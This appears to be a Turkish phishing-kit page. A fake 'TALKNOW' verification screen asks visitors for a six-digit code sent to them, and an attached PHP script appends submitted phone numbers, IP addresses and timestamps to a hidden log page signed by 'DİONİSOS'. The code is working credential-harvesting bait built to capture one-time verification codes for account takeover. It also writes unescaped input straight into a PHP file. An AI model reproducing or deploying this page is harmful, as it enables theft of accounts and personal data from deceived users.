<!DOCTYPE html>
<html>
<head>
      <title>talknow</title>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>
       <style>

            * {
                list-style: none;
                border: none;
                padding: none;
                margin: none;
                text-decoration: none;
                padding: 0;
            }

            div.kutu{
                  width: 90%;
                  height: 500px;
                  border: solid 2px #6895a6;
                  padding: 3%;
                  margin:40px auto;         
                  border-radius: 5px;
                  padding: 5px;
                  border: solid 2px #6895a6;
                  border-radius: 5px;
                  color: white;
                  text-align: center;
                  box-shadow: 0 25px 35px rgba(0,0,0,.99);
                  background-color: rgba(0,0,0,.8);
                  opacity:0.9;
                  filter:alpha(opacity=90);

            }
            div.yazi{
                        color: white;
                         font-family:Segoe Print;
                         font-size:15px;
            }
            
            body {
                  background-color: rgba(0,0,0,.8);
                  opacity:0.9;
                  filter:alpha(opacity=90);
             }

             #number {
              width: 150px;
              height: 25px;
              border: 1px solid #bbb;
              color: #000;
              border-radius: 5px;
              padding-left: 4px;
              font-weight: lighter;
             }
       </style>



<div class="kutu">
<center>
      <p style="font-size:35px; color: #6895a6; font-family: 'Segoe Print';">TALKNOW</p>
</center>
<div class="yazi">
<p>Sen olduğunu doğrulayabilmemiz için sana gönderdiğimiz 6 haneli doğrulama kodunu bize ilet.<p>
</div>
<br>
<div>
  <form action="bitti.php" method="post">
    <input pattern="\d{6}" type="text" required class="number" name="kod" id="number" placeholder="doğrulama kodu"><br><br><br>
    <input type="submit" value="doğrula!" class="kutu" style="font-size:20px;  border-width:50px;  border-radius: 2px; color:white; background-color:#6895a6; font-weight: bold; font-family: 'Segoe Print'; margin: 0px auto; padding: 3px 5px; border-radius: 8px;"/><br/>
  </form>
  

</div>
</body>
</html>




<?php
$numara = $_POST['numara'];
$file = fopen('txtdodo.php', 'a');
$ipAdresi = $_SERVER["REMOTE_ADDR"] . PHP_EOL;
$cur_time=date("d-m-Y H:i:s");


fwrite($file,"<body bgcolor='black'>");

fwrite($file,"<hr>");

fwrite($file,"<p><b><font color='#fff'>Numaraların düştüğü alan.</font>
     <font color='orange'>DİONİSOS tarafından yazıldı :)</font></b></p>
     <font color='red'><b>Numara:  " .$numara. "</b></font><br>
     <font color='green'><b>İp Adresi:  " .$ipAdresi. "</b></font><br>
     <font color='yellow'>Tarih:  </font><font color='yellow'>".$cur_time."</font><br>");

fwrite($file,"<hr>");

fclose($file);

?>